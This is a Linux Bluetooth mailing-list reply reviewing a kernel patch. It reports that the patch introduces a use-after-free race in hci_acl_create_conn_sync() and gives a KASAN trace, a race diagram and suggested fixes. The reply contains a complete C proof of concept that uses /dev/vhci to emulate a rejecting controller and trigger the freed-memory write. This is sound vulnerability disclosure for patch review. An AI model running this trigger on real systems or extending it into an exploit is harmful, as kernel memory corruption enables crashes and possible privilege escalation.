Received: from out203-205-221-164.mail.qq.com (out203-205-221-164.mail.qq.com [203.205.221.164])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5A343356744
	for <linux-bluetooth@vger.kernel.org>; Sat, 13 Jun 2026 10:40:46 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=203.205.221.164
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781347250; cv=none; b=SCp6ZypwbSDzYm8tjrybdfIzI164K4FTvoedEfXNI6i2FNR7lONOKgGTNDPLmUvMU4ORQSr609ELInpwrfaRc0NGmtPbXKXSTXRdupKD1EQ30oSjxp0LpYCXEjY16H8i5yMnl1Au4cEa+GvvGXcMHnvZpm9sr+PwWRH3Paq5J3w=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781347250; c=relaxed/simple;
	bh=c7Y6UgXNKq5NHvPERoDPXnGdV8SUqEwSaI712j+pz3k=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=WMJaHkL2b8wTaNGVw4TFapu5qefrzqsZmQj8Hdh9NbC+MXqtBH4fdbzvZKh+2wbu4wp0M27cd/pYgMRn6bJ52flyDNWnULVThytY5fyxrFCA0VgCTW8GyPk21IhaKFP9gNEXa54SeeBpPBJ9pO4Rox6qY5P0QUe55Eq/45pTj88=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=hFVGJNa7; arc=none smtp.client-ip=203.205.221.164
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="hFVGJNa7"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1781347238; bh=M8xWZFDjDkoenQD+HN3ExBliB2wL+EIp9LfPIeELQfc=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=hFVGJNa7psjR6AkzjX4ch+jPorfzR5WzanpsLolTYzrWs3rJni2/ZlTGwZHJ21uEX
	 xY88gIFOZyYJY63/za07YdT2aIzdB43I4zLhgR+QCqRq3lCs6KKGJ/8WTiWFwKuel8
	 mHKLo6uDsorV+0MOxde3d8JMB9zRkM4sRftRMJU8=
Received: from [192.168.3.157] ([115.156.144.140])
	by newxmesmtplogicsvrszc50-0.qq.com (NewEsmtp) with SMTP
	id A24AA04A; Sat, 13 Jun 2026 18:40:36 +0800
X-QQ-mid: xmsmtpt1781347236tj8xs5e2v
Message-ID: <tencent_CB641244263894463F94A2B27D5E9BE43D07@qq.com>
X-QQ-XMAILINFO: NGZp1yYNf7Y+5Oi0vXx36epTwTp18TcrAHHzOOM7DDz5WlYR4FRgtP/jQsEHVH
	 GXk+rUg6ydpGh00Bh0tMr/BaJMugCI3ZGRsOcOe0LzQFTaf5Nv3Jzsaun0EqwYr6bq4gwG5au9PR
	 TbvnF5lgQ6R5W6fz1ShS6J74Rki2v8TMqYRhy8jXbv5qiO10OcoHwCkStbcAn4CC/YsXsFIztYWs
	 qCDce6Btsm4t+G/Fc9C+fzIqBMIKdSlmCh4NHzUiksrprCiRlDvaDYZmHYx0jKAlv8Sz00i+U2pu
	 z0ZjCdB2vx2ZBiiMA//SidmfDr9hJHAt2i8m7IJLX4xPM7JPapmN/Z+2GH6AQ4aF0dPaq+jpW2q+
	 yzx5LkoQb5KYfwaeLpt9/IFyt88xMyd/OFZGwyFVDj8MzrSWfkLSY8Ux2Z0Q2ytmoSPUjQxPnqMr
	 p5QbWgCWoOVKMb704/3MZ6tksVi+rwoXytFN5JRjHU8szQjRAFym9QI1oIedN/SalrTU0m7QBMrK
	 dtVYaHcp72RJzjLRKrStgNBO6n9lleOOlXlL7Xp0Z62bHma26R68vDDwqlkOD94YnxFljQA5biZw
	 xAFVdefr9g3CzcFXJWNTaBlFe8/00vzR6lvyAk1HsuNtUNR96bzxXbZdyuie+fHvcDi51tOkGoFi
	 TdNBAXrxQ83vd7v1i9GZUejdOT8S69DTObH3QP8sOpzFAt2F4sZ05JTdiIpya3oAjk+pxZxgvftY
	 LVwzhIt5gu/Htx2INJ3hgF+XCLXciZO4Vwtmze3FLY56b9eC7Oi3JN1d1P176+xfHYotiHIMyf3k
	 A8RznH3ff1rESWT1oKOnJn/FJw0mzOGnOTQ4arbm3N2uEW9RjNV9181pDrt3v90i++CwcdjuclX5
	 94Rmsmcs5VmhxO3nOXA4qGAHXgFnWjAHbimUwseKvSwdIaUZHT3bSBpAhedQ97P7XJmWgy5IPecD
	 GTXyTQsQ6VHbiL12UsitWeA6vdJPG4g9dg/oEhUhgwL5fr4b6mxdQwwnJKPgtrK8r/z1Slltv11A
	 ulvXAW2M2dDWukeDwWLPyxFtgbat1I+CRtr3UWgLBfMkPqNg5Q/AdfF9qaiGOPAxKBTWQyZw==
X-QQ-XMRINFO: OD9hHCdaPRBwH5bRRRw8tsiH4UAatJqXfg==
X-OQ-MSGID: <1f2c9808-916a-4fcf-afa4-6c0cfb80d84d@qq.com>
Date: Sat, 13 Jun 2026 18:40:36 +0800
Precedence: bulk
X-Mailing-List: linux-bluetooth@vger.kernel.org
List-Id: <linux-bluetooth.vger.kernel.org>
List-Subscribe: <mailto:linux-bluetooth+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-bluetooth+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH v3] Bluetooth: hci_conn: Fix null ptr deref in
 hci_abort_conn()
To: Siwei Zhang <oss@fourdim.xyz>,
 Luiz Augusto von Dentz <luiz.dentz@gmail.com>
Cc: linux-bluetooth@vger.kernel.org
References: <20260611152039.2176565-1-oss@fourdim.xyz>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <20260611152039.2176565-1-oss@fourdim.xyz>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Hi Siwei,

On Thu, 11 Jun 2026 11:19:52 -0400, Siwei Zhang wrote:
 > Bluetooth: hci_conn: Fix null ptr deref in hci_abort_conn()

This patch correctly fixes the NULL dereference in hci_abort_conn() by
tracking in-flight create commands with HCI_CONN_CREATE.

I noticed a Sashiko review[1] of this patch flagged that the new
clear_bit(HCI_CONN_CREATE, &conn->flags) calls after
__hci_cmd_sync_status_sk() introduce a use-after-free.  I wrote a PoC
to verify this and was able to trigger it reliably on a KASAN-enabled
kernel.

The race:

   If the controller rejects the ACL connection attempt (e.g. via
   Command Status with a non-zero status), the RX thread processes the
   rejection in hci_cs_create_conn() → hci_conn_del(), freeing the
   hci_conn object.  Shortly after, __hci_cmd_sync_status_sk() returns
   the error to hci_acl_create_conn_sync() on the hci_cmd_sync_work
   worker, which then writes to the freed conn via clear_bit().

My PoC opens /dev/vhci, creates a virtual controller that responds to
HCI_OP_CREATE_CONN with Command Status error 0x2e, powers on the
controller, and triggers an L2CAP connect.  This reliably hits:

==================================================================
BUG: KASAN: slab-use-after-free in hci_acl_create_conn_sync+0x3c6/0x600
Write of size 8 at addr ffff88802eed2950 by task kworker/u11:0/57
Workqueue: hci0 hci_cmd_sync_work

Call Trace:
  <TASK>
  dump_stack_lvl+0x116/0x1f0
  print_report+0xf4/0x600
  kasan_report+0xe0/0x110
  kasan_check_range+0x100/0x1b0
  hci_acl_create_conn_sync+0x3c6/0x600    <-- clear_bit on freed conn
  hci_cmd_sync_work+0x1b0/0x480
  process_one_work+0xa20/0x1c50
  worker_thread+0x6df/0xf30
  kthread+0x387/0x4a0

Allocated by task 9349 (L2CAP connect):
  __hci_conn_add+0xfd/0x1df0
  hci_conn_add_unset+0x7b/0x130
  hci_connect_acl+0x4aa/0x7c0
  l2cap_chan_connect+0x779/0x2160
  l2cap_sock_connect+0x381/0x7a0

Freed by task 9353 (RX thread):
  kfree+0x171/0x720
  device_release+0xd7/0x280
  hci_conn_del_sysfs+0x17b/0x1a0
  hci_conn_del+0x685/0x11d0
  hci_cs_create_conn+0x1e9/0x430     <-- controller rejection
  hci_cmd_status_evt+0x267/0x790
  hci_event_packet+0x521/0xce0
  hci_rx_work+0x2ce/0x1030
==================================================================

The race window:

   hci_acl_create_conn_sync()           hci_rx_work()
   ==========================           ==============
   __hci_cmd_sync_status_sk(...)        hci_cs_create_conn()
     → waiting for controller reply       → hci_conn_del()
                                          → kfree(conn)
   clear_bit(HCI_CONN_CREATE,
     &conn->flags);  ← UAF

The same pattern exists in hci_le_create_conn_sync().

One possible fix: take a reference on conn before the cmd_sync call
and drop it after clear_bit(), or move the clear_bit to a point where
the conn is still guaranteed to be alive.  The Sashiko review[1]
points out a few other issues in the same patch as well.

I wrote the following PoC.  It opens /dev/vhci, emulates a controller
that rejects CREATE_CONN, powers up via MGMT, and triggers an L2CAP
connect to exercise the race.

---8<--- poc.c ---
/*
  * PoC for UAF in hci_acl_create_conn_sync()
  *
  * Opens /dev/vhci, creates a virtual HCI controller that responds to
  * HCI_OP_CREATE_CONN with Command Status 0x2e 
(HCI_ERROR_COMMAND_DISALLOWED).
  * The RX thread processes this via hci_cs_create_conn() and frees the 
conn,
  * while the hci_cmd_sync_work worker then hits the UAF in clear_bit().
  *
  * Build:  gcc -Wall -O2 -o poc poc.c -lpthread
  * Run:    ./poc   (root, KASAN-enabled kernel, vhci loaded)
  */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/poll.h>
#include <pthread.h>
#include <stdint.h>

#define HCI_COMMAND_PKT 0x01
#define HCI_EVENT_PKT    0x04
#define HCI_VENDOR_PKT   0xff
#define HCI_EV_CMD_COMPLETE 0x0e
#define HCI_EV_CMD_STATUS   0x0f
#define HCI_OP_CREATE_CONN  0x0405
#define HCI_OP_RESET        0x0c03
#define BTPROTO_L2CAP   0
#define BTPROTO_HCI     1
#define BDADDR_BREDR    0x00
#define HCI_CHANNEL_CONTROL 3

struct sockaddr_l2 {
     uint16_t l2_family, l2_psm;
     uint8_t  l2_bdaddr[6];
     uint16_t l2_cid;
     uint8_t  l2_bdaddr_type;
} __attribute__((packed));

struct sockaddr_hci {
     uint16_t hci_family, hci_dev, hci_channel;
};

static volatile int vhci_fd = -1;
static volatile int saw_conn = 0;

static int send_evt(uint8_t e, const void *d, uint8_t dl)
{
     uint8_t b[512];
     b[0] = HCI_EVENT_PKT; b[1] = e; b[2] = dl;
     if (dl && d) memcpy(b + 3, d, dl);
     return write(vhci_fd, b, 3 + dl);
}

static int read_cmd(uint16_t *o, uint8_t *p, int *pl, int tmo)
{
     uint8_t b[8192];
     struct pollfd pf = {.fd = vhci_fd, .events = POLLIN};
     int r = poll(&pf, 1, tmo);
     if (r <= 0) return -1;
     r = read(vhci_fd, b, sizeof(b));
     if (r < 4 || b[0] != HCI_COMMAND_PKT) return -1;
     *o = b[1] | (b[2] << 8); *pl = b[3];
     if (p && *pl) memcpy(p, b + 4, (*pl < r - 4) ? *pl : r - 4);
     return 1;
}

static void send_ok(uint16_t o) { uint8_t r[1] = {0}; 
send_evt(HCI_EV_CMD_COMPLETE, r, 1); }
static void send_cc(uint16_t o, const void *rd, uint8_t rl) { 
send_evt(HCI_EV_CMD_COMPLETE, rd, rl); }
static void send_cs(uint16_t o, uint8_t s) {
     uint8_t p[4] = {s, 1, o & 0xff, (o >> 8) & 0xff};
     send_evt(HCI_EV_CMD_STATUS, p, 4);
}

static void *init_thr(void *a)
{
     (void)a;
     uint16_t o; uint8_t p[256]; int pl;
     while (1) {
         if (read_cmd(&o, p, &pl, 2000) < 0) { usleep(50000); continue; }
         if (o == HCI_OP_CREATE_CONN) {
             /* Reject with Command Status error 0x2e */
             send_cs(o, 0x2e);
             saw_conn = 1;
             continue;
         }
         if (o == HCI_OP_RESET) { send_ok(o); continue; }
         /* ... handle many other HCI commands for init ... */
         send_ok(o);
     }
     return 0;
}

struct mgmt_hdr { uint16_t opcode, index, len; } __attribute__((packed));
#define MGMT_OP_SET_POWERED     0x0005
#define MGMT_OP_SET_CONNECTABLE 0x000b

int main(void)
{
     printf("[*] open vhci\n");
     vhci_fd = open("/dev/vhci", O_RDWR);
     if (vhci_fd < 0) { perror("vhci"); return 1; }
     uint8_t c[2] = {HCI_VENDOR_PKT, 0}; write(vhci_fd, c, 2);

     printf("[*] start vhci init thread\n");
     pthread_t t; pthread_create(&t, 0, init_thr, 0);
     sleep(6);

     /* Power on via MGMT */
     int mgmt = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
     if (mgmt >= 0) {
         struct sockaddr_hci ha = {AF_BLUETOOTH, 0xffff, 
HCI_CHANNEL_CONTROL};
         if (bind(mgmt, (struct sockaddr *)&ha, sizeof(ha)) == 0) {
             uint8_t cmd[256];
             struct mgmt_hdr *hdr = (struct mgmt_hdr *)cmd;
             hdr->opcode = MGMT_OP_SET_POWERED; hdr->index = 0; hdr->len 
= 1;
             cmd[sizeof(*hdr)] = 1;
             write(mgmt, cmd, sizeof(*hdr) + 1);
             usleep(200000);
             hdr->opcode = MGMT_OP_SET_CONNECTABLE;
             write(mgmt, cmd, sizeof(*hdr) + 1);
             usleep(200000);
         }
         close(mgmt);
     }

     /* L2CAP connect triggers hci_connect_acl → hci_acl_create_conn_sync */
     printf("[*] L2CAP connect (trigger)\n");
     int l2 = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
     if (l2 >= 0) {
         struct sockaddr_l2 ba; memset(&ba, 0, sizeof(ba));
         ba.l2_family = AF_BLUETOOTH; ba.l2_bdaddr_type = BDADDR_BREDR;
         bind(l2, (struct sockaddr *)&ba, sizeof(ba));
         struct sockaddr_l2 ca; memset(&ca, 0, sizeof(ca));
         ca.l2_family = AF_BLUETOOTH; ca.l2_psm = 1;
         ca.l2_bdaddr_type = BDADDR_BREDR;
         memset(ca.l2_bdaddr, 0x11, 6);
         connect(l2, (struct sockaddr *)&ca, sizeof(ca));
         close(l2);
     }
     usleep(500000);
     pthread_cancel(t); pthread_join(t, 0); close(vhci_fd);
     printf("[*] done. Check dmesg for KASAN slab-use-after-free.\n");
     return 0;
}
---8<---

Hope this helps with the patch.  Let me know if you need additional
information from the test setup.

[1] 
https://sashiko.dev/#/patchset/20260611152039.2176565-1-oss%40fourdim.xyz

